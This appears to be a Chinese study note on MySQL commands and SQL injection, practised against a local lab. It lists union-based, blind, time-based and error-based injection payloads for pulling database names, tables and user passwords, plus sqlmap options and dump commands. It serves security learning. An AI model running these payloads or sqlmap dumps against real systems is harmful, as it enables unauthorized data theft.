### 常用命令

<br/>

- 连接数据库
  ```sh
  # 格式 mysql -u 用户名 -p 密码 -h 主机地址
  mysql -uroot  -proot -h 127.0.0.1
  ```
- 列出当前mysql的相关状态信息
  ```mysql
  status;
  ```
- 显示数据库
  ```mysql
  show databases;
  ```
- 打开数据库
  ```mysql
  # 格式 use 数据库名;
  use mysql;
  ```
- 显示数据表
  ```mysql
  show tables;
  ```
- 显示表结构
  ```mysql
  # 格式 describe 数据表名;
  describe user;
  # 格式 show columns from 数据表名;
  show columns from user;
  ```
- 显示表创建过程
  ```mysql
  # 格式 show create table 表名;
  show create table user;
  ```
- 清空数据表
  ```mysql
  # 格式 delete from 数据表名;
  delete from test01;
  # 格式 truncate table 数据表名;
  truncate table test01;
  ```
- 删除数据表
  ```mysql
  # 格式 drop table 数据表;
  drop table test01;
  ```
- 退出数据库连接
  ```mysql
  exit
  ```

<br/>

### MySql结构信息

<br/>

- 系统表
  > information_schema
  
  库表结构查询
  ```mysql
  /* 获取所有库名 */
  show databases;
  select schema_name from schemata;
  /* 获取指定库下面的所有表 */
  SELECT table_schema, table_name FROM TABLES WHERE table_schema = 'mysql';
  /* 获取指定库和表里面的所有列字段 */
  select column_name from columns where table_schema = 'mysql' and table_name = 'user';
  ```

<br/>

### SQL注入

- 注入分类
  
  a.按参数类型分类
  - 数字型
  - 字符型
  - 搜索型
  
  b.按数据库返回结果分类
  - 回显注入
  - 报错注入
  - 盲注
    - 基于布尔的盲注
    - 基于时间的盲注
  
  c.按注入点位置的分类
  - GET注入
  - POST注入
  - Cookie注入
  - Header注入
  
  <br/>
- 注入测试判断
  
  1.回显注入测试
  ```mysql
  # 字符型注入测试
  # 测试能查到结果
  http://10.0.0.102:809/Less-1/?id=1
  # 测试无报错，未查询到结果
  http://10.0.0.102:809/Less-1/?id=1' and '1'='2
  # 证明sql注入语句被正确执行
  
  #数字型注入测试同理
  
  # 构建错误语句判断是否被执行
  http://10.0.0.102:809/Less-1/?id=1'
  
  ```
  
  2.报错注入测试
  > mysql报错通常会被后端捕获包装成正常返回
  
  3.盲注测试
  > 由于程序后端限制数据库返回错误信息，因此查询错误或没有结果是没有信息返回的，可以通过数据库的查询逻辑和延时来对注入的结果进行判断
  > 
  > Based boolean: 基于布尔的盲注，通过返回true false判断
  > 
  > http://10.0.0.102:809/Less-1/?id=1' and '1'='1
  > 
  > http://10.0.0.102:809/Less-1/?id=1' and '1'='2
  
  Based time: 基于time的盲注，通过判断回显的时间判断
  > 时间盲注；如果有结果就会延时返回，没有结果就立马返回空
  > 
  > select * from users where id = '-1' and sleep(5)
  > 
  > http://10.0.0.102:809/Less-1/?id=1' and sleep(5)--+
  > 
  > http://10.0.0.102:809/Less-1/?id=1' and if(substr((select database()),1,1)='s',sleep(5),null)--+
  
  <br/>
- SQL注入利用
  
  常用方法函数
  ```mysql
  # 获取所有数据库
  # 获取所有数据表
  # 获取所有列字段
  # 前面information_schema已记录，此处不重复补充
  
  # 获取字段数，猜列数
  select * from users order by 5; -- 数字用来测试有多少个列字段
  # 获取指定行
  select * from users where id ='-1' or '1'='1' limit 0,1; -- 在第一个条件不符合的情况下，获取任意行
  # 获取显示位
  select * from users where id = '1' union select 1,2,3,4.....;  -- 可以测试返回字段对应列数
  # 获取数据库信息
  select version();  -- user() , @@datadir , @@version_compile_os 等等函数不一一列举
  # 获取当前数据库
  select database();  -- schema()
  select schema();
  # 当前连接用户
  select user();
  # 数据库路径
  select @@datadir;
  # 操作系统版本
  select @@version_compile_os;
  
  # 合并结果字符函数 concat concat_ws group_concat
  select concat('1','#','1'); -- 返回1#1
  select concat_ws('#','1','2','3','4'); -- 返回1#2#3#4  不限制后面入参的个数
  select group_concat(username) from users; -- 将一列的多行数据用逗号拼接返回
  
  ```
- 回显注入(显错注入)
  
  常用步骤实例
  ```mysql
  # 判断SQL是否执行
  select * from users where id = '1' and 1=1;
  select * from users where id = '1' or 1=1;
  
  # 判断字段数量
  select * from users where id = '1' order by 3;
  
  # 联合查询获取显示位
  select * from users where id = '1' union select 1,2,3;
  
  # 获取当前数据库
  select * from users where id = '-1' union select 1,(select database()),3;
  
  # 获取所有数据库
  select * from users where id = '-1' union select 1,(group_concat(schema_name)),3 from information_schema.schemata;
  
  # 获取当前数据库表名
  select * from users where id = '-1' union select 1,(group_concat(table_name)),3 from information_schema.tables where table_schema = 'security';
  
  # 获取users表所有字段
  select * from users where id = '-1' union select 1,(group_concat(column_name)),3 from information_schema.columns where table_schema = 'security' and table_name = 'users';
  
  # 获取users表数据字段内容
  select * from users where id '-1' union select 1,username,password from users limit 1,1;
  
  ```
- 盲注
  
  常用方法函数
  ```mysql
  # 截取数据，从第一个字符，截取一位
  select mid(database(),1,1);
  select substr(database(),1,1);
  
  # 返回ascii码数值
  select ascii('a');
  # 将截取出来的字符转换成ASCII码，后面做运算
  select ascii(substr(database(),1,1));
  select ascii(substr(database(),1,1))>97;
  
  # 返回字符串第一个字符的ascii码
  select ord('hello');
  
  # 返回arg最左边的指定个字符
  select left(database(),1);
  
  # 返回最右边的指定个字符
  select right(database(), 1);
  
  # 返回文本字段中值的长度
  select length(database());
  
  # 返回匹配指定条件的行数
  select count(*) from users;
  
  ```
  
  操作步骤
  ```mysql
  -- 操作步骤
  1、获取当前数据库长度
  2、获取当前数据库名
  3、获取当前数据库表总数
  4、获取当前数据库表的长度
  5、获取当前数据库表名
  6、获取当前数据库表的字段总数
  7、获取当前数据库表的字段第N个长度
  8、获取当前数据库表的字段第N个字段名
  9、获取当前数据库表的字段内容长度
  10、获取当前数据库表的字段内容
  
  # 判断
  select * from users where id = '1' and 1=1;
  
  # 获取当前数据库长度(猜长度)
  select * from users where id = '1' and length(database()) = 8;
  
  # 获取当前数据库版本(猜数据库版本)
  select * from users where id = '1' and left(version(),6) = '5.5.44';
  
  # 获取当前数据库名第一个字符
  select * from users where id = '1' and ord(mid(database(),1,1)) = 115; 
  select * from users where id = '1' and ascii(substr(database(),1,1)) = 115;
  
  # 获取当前数据库表总数(猜数据库表有多少个)
  select * from users where id = '1' and (select count(table_name) from information_schema.tables where table_schema = database()) = 4;
  
  # 获取当前数据库表长度(猜长度)
  select * from users where id = '1' and (select length(table_name) from information_schema.tables where table_schema = database() limit 0,1) = 6
  
  # 获取当前数据库表的第一个字符
  select * from users where id = '1' and ascii(mid((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1)) = 101
  
  ```
- 报错注入
  > 通过函数报错获取信息，使用一些指定的函数来制造报错信息，从而获取报错信息中特定的信息。前提是后台没有屏蔽数据库报错信息，发生错误是会输出错误信息在前端页面。
常用函数
  ```mysql
  updatexml()
  extractvalue()
  floor()
  ```
  
  作用：在报错位置处，用concat()拼接我们想要的语句，产生错误即可输出我们想要的结果。
  ```mysql
  # 十大报错注入函数
  
  # 1.floor()
  select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);
  
  # 2.extractvalue()
  select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));
  
  # 3.updatexml()
  select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));
  
  # 4.geometrycollection()
  select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));
  
  # 5.multipoint()
  select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));
  
  # 6.polygon()
  select * from test where id=1 and polygon((select * from(select * from(select user())a)b));
  
  # 7.multipolygon()
  select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));
  
  # 8.linestring()
  select * from test where id=1 and linestring((select * from(select * from(select user())a)b));
  
  # 9.multilinestring()
  select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));
  
  # 10.exp()
  select * from test where id=1 and exp(~(select * from(select user())a));
  ```

<br/>

### SQL注入工具利用

<br/>

- SQLMAP
  > 一款开源的SQL注入工具
  > 
  > https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-zh-CN.md
  > 
  > https://github.com/sqlmapproject/sqlmap/wiki/Usage
  
  命令选项
  ```sh
  -a, --all           检索所有内容
  -b, --banner        检索 DBMS banner
  --current-user      检索 DBMS 当前用户
  --current-db        检索 DBMS 当前数据库
  --hostname          检索 DBMS 服务器主机名
  --is-dba            检测 DBMS 当前用户是否为 DBA
  --users             枚举 DBMS 用户
  --passwords         枚举 DBMS 用户密码哈希
  --privileges        枚举 DBMS 用户权限
  --roles             枚举 DBMS 用户角色
  --dbs               枚举 DBMS 数据库
  --tables            枚举 DBMS 数据库表
  --columns           枚举 DBMS 数据库表列
  --schema            枚举 DBMS 架构
  --count             检索表的条目数
  --dump              转储 DBMS 数据库表条目
  --dump-all          转储所有 DBMS 数据库表表条目
  --search            搜索列、表 和/或 数据库名称
  --comments          在枚举期间检查 DBMS 注释
  --statements        检索在 DBMS 上运行的 SQL 语句
  -D DB               要枚举的 DBMS 数据库
  -T TBL              要枚举的 DBMS 数据库表
  -C COL              要枚举的 DBMS 数据库表列
  -X EXCLUDE          要不枚举的 DBMS 数据库标识符
  -U USER             要枚举的 DBMS 用户
  --exclude-sysdbs    枚举表时排除 DBMS 系统数据库
  --pivot-column=P..  数据透视列名称
  --where=DUMPWHERE   表转储时使用 WHERE 条件
  --start=LIMITSTART  要检索的第一个转储表条目
  --stop=LIMITSTOP    要检索的最后一个转储表条目
  --first=FIRSTCHAR   要检索的第一个查询输出单词字符
  --last=LASTCHAR     要检索的最后一个查询输出单词字符
  --sql-query=SQLQ..  要执行的 SQL 语句
  --sql-shell         交互式 SQL 外壳的提示
  --sql-file=SQLFILE  从给定文件执行 SQL 语句
  
  ##########
  
  --technique=TECH..  使用的SQL注入技术 (default "BEUSTQ")
  --time-sec=TIMESEC  延迟DBMS响应的秒数 (default 5)
  --union-cols=UCOLS  要测试UNION查询SQL注入的列范围
  --union-char=UCHAR  用于暴力破解列数的字符
  --union-from=UFROM  在UNION查询SQL注入的FROM部分中使用的表
  --dns-domain=DNS..  用于DNS渗透攻击的域名
  --second-url=SEC..  搜索结果页面URL以获取二阶响应
  --second-req=SEC..  从文件加载二阶HTTP请求
  
  ####### Request选项
  -A AGENT, --user..  指定HTTP请求 User-Agent 报头值
  -H HEADER, --hea..  其他header (e.g. "X-Forwarded-For: 127.0.0.1")
  --method=METHOD     强制使用给定的HTTP方法(e.g. PUT)
  --data=DATA         通过POST发送的数据字符串 (e.g. "id=1")
  --param-del=PARA..  用于分割参数值的字符 (e.g. &)
  --cookie=COOKIE     HTTP Cookie 报头值 (e.g. "PHPSESSID=a8d127e..")
  --cookie-del=COO..  用于分割cookie值的字符 (e.g. ;)
  --load-cookies=L..  包含Netscape/wget格式cookies的文件
  --drop-set-cookie   忽略响应中的Set-Cookie头
  --mobile            通过HTTP User-Agent 头模拟智能手机
  --random-agent      使用随机选择的HTTP用户代理头值
  --host=HOST         HTTP Host header value
  --referer=REFERER   HTTP Referer header value
  --headers=HEADERS   额外的 headers (e.g. "Accept-Language: fr\nETag: 123")
  --auth-type=AUTH..  HTTP身份验证类型 (Basic, Digest, NTLM or PKI)
  --auth-cred=AUTH..  HTTP身份验证凭证 (name:password)
  --auth-file=AUTH..  HTTP身份验证PEM证书/私钥文件
  --ignore-code=IG..  忽略(有问题的)HTTP错误代码 (e.g. 401)
  --ignore-proxy      忽略系统默认代理设置
  --ignore-redirects  忽略重定向的尝试
  --ignore-timeouts   忽略连接超时
  --proxy=PROXY       使用代理连接到目标URL
  --proxy-cred=PRO..  代理身份验证凭证 (name:password)
  --proxy-file=PRO..  从文件加载代理列表
  --tor               使用Tor匿名网络
  --tor-port=TORPORT  设置Tor代理端口以外的默认
  --tor-type=TORTYPE  设置Tor代理类型(HTTP, SOCKS4或SOCKS5(default))
  --check-tor         检查Tor是否正确使用
  --delay=DELAY       每个HTTP请求之间的延迟(秒)
  --timeout=TIMEOUT   等待超时连接秒 (default 30)
  --retries=RETRIES   当连接超时时重试 (default 3)
  --randomize=RPARAM  随机改变给定参数的值
  --safe-url=SAFEURL  测试期间经常访问的URL地址
  --safe-post=SAFE..  POST数据发送到一个安全的URL
  --safe-req=SAFER..  从文件加载安全的HTTP请求
  --safe-freq=SAFE..  访问安全URL之间的定期请求
  --skip-urlencode    跳过有效负载数据的URL编码
  --csrf-token=CSR..  用于保存反csrf令牌的参数
  --csrf-url=CSRFURL  提取反csrf令牌访问的URL地址
  --csrf-method=CS..  在反csrf令牌页面访问期间使用的HTTP方法
  --csrf-retries=C..  重新尝试获取反csrf令牌 (default 0)
  --force-ssl         强制使用SSL/HTTPS
  --chunked           使用HTTP分块传输编码 (POST) 请求
  --hpp               使用HTTP参数污染方法
  --eval=EVALCODE     在请求之前评估提供的Python代码 (e.g. "import hashlib;id2=hashlib.md5(id).hexdigest()")
  
  #####Target选项
  -u URL, --url=URL   目标url (e.g. "http://www.site.com/vuln.php?id=1")
  -d DIRECT           用于直接数据库连接的连接字符串
  -l LOGFILE          从Burp或WebScarab代理日志文件解析目标
  -m BULKFILE         扫描文本文件中给定的多个目标
  -r REQUESTFILE      从文件加载HTTP请求
  -g GOOGLEDORK       将谷歌结果处理为目标url
  -c CONFIGFILE       从INI配置文件加载选项
  
  ```
  
  常用命令操作
  ```sh
  get注入测试
  
  # 1.测试目标是否存在SQL注入漏洞
  python3 sqlmap.py -u http://127.0.0.1:809/Less-1/?id=1
  
  # 2.获取当前用户
  python3 sqlmap.py -u http://127.0.0.1:809/Less-1/?id=1 --current-user
  
  # 3.获取当前数据库
  python3 sqlmap.py -u http://127.0.0.1:809/Less-1/?id=1 --current-db
  
  # 4.获取所有数据库名
  python3 sqlmap.py -u http://127.0.0.1:809/Less-1/?id=1 --dbs
  
  # 5.获取数据库的表名
  python3 sqlmap.py -u http://127.0.0.1:809/Less-1/?id=1 -D 库名 --tables
  
  # 6.获取数据表下的字段名
  python3 sqlmap.py -u http://127.0.0.1:809/Less-1/?id=1 -D 库名 -T 表名 --columns
  
  # 7.获取字段值
  python3 sqlmap.py -u http://127.0.0.1:809/Less-1/?id=1 -D 库名 -T 表名 -C 列字段1,列字段2,列字段3 -dump
  
  # 8.指定post参数查询；显示3级详细信息
  sqlmap -u http://10.0.0.102:809/Less-11/ --data "passwd=123&uname=123" -p uname -vvv
  
  ```
